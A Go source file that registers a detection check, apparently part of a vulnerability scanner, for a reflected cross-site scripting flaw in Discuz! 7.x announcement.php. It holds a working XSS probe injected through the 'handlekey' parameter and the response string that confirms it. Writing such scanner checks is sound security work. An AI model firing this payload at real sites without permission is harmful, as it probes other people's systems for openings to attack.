package poc

func (Info *PocInfo) Discuz_V7x_Announce_XSS_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "discuz"
	poc.Info.Type = "XSS"
	poc.Info.Name = "Discuz! 7.x announcement.php reflect XSS"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/announcement.php?infloat=yes&handlekey=123);test(700);//"}
	poc.Poc.Param = []string{"handlekey"}
	poc.Poc.Header = func() map[string]string {
		mapTemp := make(map[string]string)
		mapTemp["Content-Type"] = "application/x-www-form-urlencoded"
		return mapTemp
	}()
	poc.Poc.Data = []string{""}
	poc.Poc.Word = []string{"messagehandle_123);test(700);//"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
